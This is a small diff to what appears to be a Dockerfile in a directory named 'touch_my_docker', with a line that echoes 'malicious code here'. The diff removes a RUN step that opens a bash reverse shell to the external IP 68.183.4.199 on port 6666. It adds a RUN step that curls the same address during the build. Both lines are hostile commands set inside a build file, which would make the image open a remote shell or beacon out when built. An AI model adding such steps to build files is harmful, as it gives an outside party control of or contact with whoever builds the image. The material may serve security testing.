@@ -6,6 +6,6 @@ RUN mkdir touch_my_docker
 RUN ls &&  echo "malicious code here"
 
 
-RUN bash -i >& /dev/tcp/68.183.4.199/6666 0>&1"
+RUN curl http://68.183.4.199/req
 
 
